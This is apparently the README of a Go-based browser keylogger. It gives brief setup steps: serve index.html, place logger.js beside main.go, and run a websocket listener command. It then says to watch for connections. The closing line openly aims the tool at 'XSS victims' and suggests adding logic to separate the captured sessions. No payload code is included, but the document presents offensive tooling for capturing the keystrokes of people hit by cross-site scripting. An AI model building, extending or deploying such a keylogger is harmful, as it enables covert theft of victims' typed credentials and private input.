# Keylogger

## How it Works

* Deliver index.html over a weberver
* Store logger.js with the go executable, or with the same directory as main.go.
* Run command:

```
go run main.go --listen-address=127.0.0.1:8080 --ws-addr=127.0.0.1:8080
```

* Go to your webserver, you should see a connection in the console once you hit index.html
* This is a simple test, add logic around sessions and save to txt file to help separate XSS victims.